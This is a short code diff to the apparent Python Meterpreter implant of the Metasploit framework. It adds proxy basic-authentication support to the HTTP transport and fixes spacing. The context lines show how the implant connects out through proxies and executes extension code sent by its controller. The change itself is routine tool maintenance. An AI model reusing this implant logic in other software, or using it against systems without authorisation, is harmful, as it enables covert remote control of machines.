@@ -22,7 +22,7 @@ else:
     has_windll = hasattr(ctypes, 'windll')
 
 try:
-    urllib_imports = ['ProxyHandler', 'Request', 'build_opener', 'install_opener', 'urlopen']
+    urllib_imports = ['ProxyBasicAuthHandler', 'ProxyHandler', 'HTTPSHandler', 'Request', 'build_opener', 'install_opener', 'urlopen']
     if sys.version_info[0] < 3:
         urllib = __import__('urllib2', fromlist=urllib_imports)
     else:
@@ -969,6 +969,7 @@ class HttpTransport(Transport):
             opener_args.append(urllib.HTTPSHandler(0, ssl_ctx))
         if proxy:
             opener_args.append(urllib.ProxyHandler({scheme: proxy}))
+            opener_args.append(urllib.ProxyBasicAuthHandler())
         self.proxy = proxy
         opener = urllib.build_opener(*opener_args)
         opener.addheaders = []
@@ -1423,7 +1424,7 @@ class PythonMeterpreter(object):
             libname = match.group(1)
 
         self.last_registered_extension = None
-        symbols_for_extensions = {'meterpreter':self}
+        symbols_for_extensions = {'meterpreter': self}
         symbols_for_extensions.update(EXPORTED_SYMBOLS)
         i = code.InteractiveInterpreter(symbols_for_extensions)
         i.runcode(compile(data_tlv['value'], 'ext_server_' + libname + '.py', 'exec'))
